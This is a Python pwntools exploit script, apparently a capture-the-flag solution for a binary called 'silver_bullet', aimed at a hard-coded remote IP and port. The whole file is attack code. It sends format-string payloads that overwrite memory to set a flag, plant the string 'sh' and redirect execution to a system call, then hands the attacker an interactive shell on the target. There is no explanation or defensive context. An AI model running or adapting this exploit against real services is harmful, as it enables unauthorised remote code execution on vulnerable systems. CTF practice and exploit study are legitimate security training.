from pwn import *

# r = process('./silver_bullet')
r = remote('37.139.17.37', 7331)

MAIN_CALLABLE = 0x804886d
CALL_CALL_SYSTEM = 0x80486c7

IS_CALL_SYSTEM = 0x804a02c
CMD_ADDR = 0x804a030
CMD = 0x804a070

def write_and_prepare(val, addr_next_write, addr_call=MAIN_CALLABLE):
	payload = ''
	if val is not None:
		payload += '%{}c%26$hn'.format(val & 0xffff)
	payload += 'A' * (0x10 - len(payload))
	payload += p32(addr_next_write) if addr_next_write is not None else 'A' * 4
	payload += p32(addr_call)
	payload += 'hoge'
	r.sendline(payload)
	r.recvuntil('hoge')

write_and_prepare(None, IS_CALL_SYSTEM)
write_and_prepare(1, CMD_ADDR)
write_and_prepare(CMD, CMD_ADDR + 2)
write_and_prepare(CMD >> 16, CMD)
write_and_prepare(ord('s') + ord('h') * 0x100, None, CALL_CALL_SYSTEM)

r.interactive()
